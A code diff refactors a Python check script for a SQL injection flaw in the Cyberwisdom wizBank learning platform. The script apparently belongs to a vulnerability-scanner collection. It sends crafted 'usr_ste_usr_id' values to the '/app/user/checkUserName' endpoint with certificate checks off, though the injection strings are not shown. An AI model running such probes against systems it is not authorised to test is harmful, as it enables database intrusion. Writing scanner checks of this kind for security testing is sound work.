@@ -10,14 +10,7 @@ import sys
 import json
 import requests
 import warnings
-  
-  
-
-class usr_id_sqli:
-    def __init__(self, url):
-        self.url = url
-
-    def run(self):
+def run(url):
         result = ['Cyberwisdom wizBank学习管理平台SQL注入漏洞','','']
         reqlst = []
         headers = {
@@ -27,7 +20,7 @@ class usr_id_sqli:
             payload = {
                 "usr_ste_usr_id":postdata,
                 }
-            vulnurl = self.url + r"/app/user/checkUserName"
+            vulnurl = url + r"/app/user/checkUserName"
             try:
                 req = requests.post(vulnurl, headers=headers, data=payload, timeout=10, verify=False)
                 reqlst.append(str(req.text))
@@ -45,5 +38,5 @@ class usr_id_sqli:
         return result
 if __name__ == "__main__":
     warnings.filterwarnings("ignore")
-    testVuln = usr_id_sqli(sys.argv[1])
-    testVuln.run()
+    testVuln = run(sys.argv[1])
+
